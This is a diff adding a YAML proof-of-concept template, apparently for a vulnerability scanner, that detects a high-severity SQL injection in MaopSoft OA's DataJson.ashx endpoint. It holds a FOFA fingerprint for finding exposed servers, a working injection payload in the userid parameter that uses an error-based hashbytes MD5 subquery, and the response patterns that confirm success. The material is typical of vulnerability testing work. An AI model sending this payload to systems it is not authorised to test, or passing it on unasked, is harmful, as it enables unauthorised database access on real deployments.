@@ -1,0 +1,18 @@
+id: poc-yaml-maopsoft-oa-datajson-ashx-sqli
+info:
+  name: 猫扑OA DataJson.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 猫扑OA
+  fofa: body="您是MaopSoft的VIP客户"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /api/Html/Document/DataJson.ashx?userid=-8575+OR+2250+IN+%28SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))%29
+  expression: "status_code == 500 && \ncontains(body,\"SqlException\") &&\ncontains(body,\"\
+    MaopOA\") &&\ncontains(body,\"0x\" + t2) &&\nmatches(body,\"转换成数据类型(.*?)时失败\"\
+    ) &&\nmatches(body,\"在将(.*?)值\")\n"
+transport: http
